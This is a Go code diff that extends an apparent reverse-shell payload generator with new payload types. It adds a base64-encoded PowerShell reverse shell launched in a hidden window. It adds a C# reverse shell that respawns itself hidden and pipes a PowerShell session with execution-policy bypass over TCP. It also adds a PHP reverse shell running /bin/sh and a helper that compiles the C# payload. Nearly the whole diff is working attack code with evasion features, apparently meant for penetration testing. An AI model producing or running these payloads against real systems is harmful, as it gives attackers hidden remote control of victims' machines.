@@ -3,6 +3,9 @@ package internal
 import (
 	"encoding/base64"
 	"fmt"
+	"os"
+	"os/exec"
+	"path/filepath"
 	"strings"
 )
 
@@ -44,6 +47,189 @@ func (r *ReverseShellGenerator) GeneratePowerShell() string {
 	return fmt.Sprintf("cmd /c powershell -e %s", encoded)
 }
 
+// GeneratePowerShellDetached generates a PowerShell reverse shell payload launched in a detached process.
+func (r *ReverseShellGenerator) GeneratePowerShellDetached() string {
+	psScript := fmt.Sprintf(`$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`, r.IP, r.Port)
+	utf16 := encodeUTF16LE(psScript)
+	encoded := base64.StdEncoding.EncodeToString(utf16)
+	return fmt.Sprintf(`Start-Process powershell -WindowStyle Hidden -ArgumentList @('-NoProfile','-EncodedCommand','%s') | Out-Null`, encoded)
+}
+
+// GenerateCSharpSource generates a C# reverse shell source file using PowerShell with detached child launch.
+func (r *ReverseShellGenerator) GenerateCSharpSource() string {
+	return fmt.Sprintf(strings.Join([]string{
+		"using System;",
+		"using System.Diagnostics;",
+		"using System.IO;",
+		"using System.Net.Sockets;",
+		"public class Program",
+		"{",
+		"    private static StreamWriter streamWriter;",
+		"",
+		"    private static void HandleDataReceived(object sender, DataReceivedEventArgs e)",
+		"    {",
+		"        try",
+		"        {",
+		"            if (e.Data != null)",
+		"            {",
+		"                streamWriter.WriteLine(e.Data);",
+		"                streamWriter.Flush();",
+		"            }",
+		"        }",
+		"        catch { }",
+		"    }",
+		"",
+		"    private static Process StartPowerShell()",
+		"    {",
+		"        var proc = new Process();",
+		"        proc.StartInfo.FileName = @\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\";",
+		"        proc.StartInfo.Arguments = \"-ep bypass -nologo\";",
+		"        proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;",
+		"        proc.StartInfo.UseShellExecute = false;",
+		"        proc.StartInfo.RedirectStandardOutput = true;",
+		"        proc.StartInfo.RedirectStandardError = true;",
+		"        proc.StartInfo.RedirectStandardInput = true;",
+		"        proc.OutputDataReceived += new DataReceivedEventHandler(HandleDataReceived);",
+		"        proc.ErrorDataReceived += new DataReceivedEventHandler(HandleDataReceived);",
+		"        proc.Start();",
+		"        proc.BeginOutputReadLine();",
+		"        proc.BeginErrorReadLine();",
+		"        proc.StandardInput.WriteLine(\"Get-Location | Out-Null\");",
+		"        proc.StandardInput.Flush();",
+		"        return proc;",
+		"    }",
+		"",
+		"    public static void Main(string[] args)",
+		"    {",
+		"        try",
+		"        {",
+		"            if (args.Length == 0 || args[0] != \"--child\")",
+		"            {",
+		"                var self = Process.GetCurrentProcess().MainModule.FileName;",
+		"                var psi = new ProcessStartInfo();",
+		"                psi.FileName = self;",
+		"                psi.Arguments = \"--child\";",
+		"                psi.WindowStyle = ProcessWindowStyle.Hidden;",
+		"                psi.UseShellExecute = true;",
+		"                Process.Start(psi);",
+		"                return;",
+		"            }",
+		"",
+		"            using (var client = new TcpClient(\"%s\", %d))",
+		"                    using (var stream = client.GetStream())",
+		"                    using (var reader = new StreamReader(stream))",
+		"                    {",
+		"                        streamWriter = new StreamWriter(stream);",
+		"                        streamWriter.AutoFlush = true;",
+		"                        streamWriter.WriteLine(\"FLAME_CSHARP\");",
+		"                        Process proc = StartPowerShell();",
+		"",
+		"                string userInput = \"\";",
+		"                while ((userInput = reader.ReadLine()) != null)",
+		"                {",
+		"                    proc.StandardInput.WriteLine(userInput);",
+		"                    proc.StandardInput.Flush();",
+		"                    if (userInput.Equals(\"exit\", StringComparison.OrdinalIgnoreCase))",
+		"                        break;",
+		"                }",
+		"",
+		"                try { if (!proc.HasExited) proc.Kill(); } catch { }",
+		"                try { proc.WaitForExit(); } catch { }",
+		"                proc.Dispose();",
+		"            }",
+		"        }",
+		"        catch { }",
+		"    }",
+		"}",
+	}, "\n"), r.IP, r.Port)
+}
+
+// GeneratePHPSource generates a PHP reverse shell source file.
+func (r *ReverseShellGenerator) GeneratePHPSource() string {
+	return fmt.Sprintf(strings.Join([]string{
+		"<?php",
+		"$ip = '%s';",
+		"$port = %d;",
+		"$sock = fsockopen($ip, $port, $errno, $errstr, 30);",
+		"if (!$sock) { die(\"$errstr ($errno)\\n\"); }",
+		"",
+		"$descriptors = array(",
+		"\t0 => array(\"pipe\", \"r\"),",
+		"\t1 => array(\"pipe\", \"w\"),",
+		"\t2 => array(\"pipe\", \"w\")",
+		");",
+		"",
+		"$process = proc_open(\"/bin/sh -i\", $descriptors, $pipes);",
+		"if (is_resource($process)) {",
+		"\tstream_set_blocking($pipes[0], false);",
+		"\tstream_set_blocking($pipes[1], false);",
+		"\tstream_set_blocking($pipes[2], false);",
+		"\tstream_set_blocking($sock, false);",
+		"",
+		"\twhile (true) {",
+		"\t\t$read = array($sock, $pipes[1], $pipes[2]);",
+		"\t\t$write = NULL;",
+		"\t\t$except = NULL;",
+		"\t\tstream_select($read, $write, $except, NULL);",
+		"",
+		"\t\tif (in_array($sock, $read)) {",
+		"\t\t\t$data = fread($sock, 2048);",
+		"\t\t\tif ($data === false || feof($sock)) { break; }",
+		"\t\t\tfwrite($pipes[0], $data);",
+		"\t\t}",
+		"",
+		"\t\tif (in_array($pipes[1], $read)) {",
+		"\t\t\t$data = fread($pipes[1], 2048);",
+		"\t\t\tif ($data !== false && $data !== '') { fwrite($sock, $data); }",
+		"\t\t}",
+		"",
+		"\t\tif (in_array($pipes[2], $read)) {",
+		"\t\t\t$data = fread($pipes[2], 2048);",
+		"\t\t\tif ($data !== false && $data !== '') { fwrite($sock, $data); }",
+		"\t\t}",
+		"\t}",
+		"",
+		"\tproc_close($process);",
+		"}",
+		"?>",
+	}, "\n"), r.IP, r.Port)
+}
+
+// PayloadForMode returns the payload source for a rev mode.
+func (r *ReverseShellGenerator) PayloadForMode(mode string) (string, error) {
+	switch mode {
+	case "bash":
+		return r.GenerateBash(), nil
+	case "ps1":
+		return r.GeneratePowerShell(), nil
+	case "csharp":
+		return r.GenerateCSharpSource(), nil
+	case "php":
+		return r.GeneratePHPSource(), nil
+	default:
+		return "", fmt.Errorf("unknown rev mode: %s", mode)
+	}
+}
+
+func compileCSharpSource(source, outputPath string) error {
+	tmpDir, err := os.MkdirTemp("", "flame-csharp-")
+	if err != nil {
+		return err
+	}
+	defer os.RemoveAll(tmpDir)
+
+	srcPath := filepath.Join(tmpDir, "payload.cs")
+	if err := os.WriteFile(srcPath, []byte(source), 0644); err != nil {
+		return err
+	}
+	cmd := exec.Command("mcs", "-out:"+outputPath, srcPath)
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		return fmt.Errorf("mcs failed: %v: %s", err, strings.TrimSpace(string(output)))
+	}
+	return nil
+}
+
 // encodeUTF16LE encodes a string to UTF-16 Little Endian
 func encodeUTF16LE(s string) []byte {
 	runes := []rune(s)
@@ -61,6 +247,7 @@ func (r *ReverseShellGenerator) GenerateAll() []string {
 		r.GenerateBash(),
 		r.GenerateBashBase64(),
 		r.GeneratePowerShell(),
+		r.GenerateCSharpSource(),
 	}
 }
 
@@ -70,6 +257,7 @@ func (r *ReverseShellGenerator) GetPayloadNames() []string {
 		"Bash",
 		"Bash (Base64)",
 		"PowerShell",
+		"CSharp",
 	}
 }
 
